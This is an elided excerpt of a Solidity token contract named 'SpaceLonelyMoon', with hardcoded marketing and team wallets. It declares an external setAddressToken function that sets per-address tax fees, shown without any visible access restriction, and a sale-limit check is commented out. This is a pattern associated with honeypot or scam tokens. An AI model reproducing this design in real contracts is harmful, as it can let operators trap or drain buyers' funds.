...
contract SpaceLonelyMoon is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SpaceLonelyMoon";
    string private _symbol = "SpaceLonelyMoon";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xbef46677abc25840B97BEEe27F49CAA7BF65b573); 
    address payable private teamWalletAddress = payable(0xdC0DE9Fa4cB8983bF30beB920e6d6eB985705Cca); 
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external  {
...
//			require(amount <= amountpercent, "ERC20: over Percent");
			...
			if(feeAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
				amountpercent = feeAmount.mul(_percent).div(_totalTaxIfSelling); 
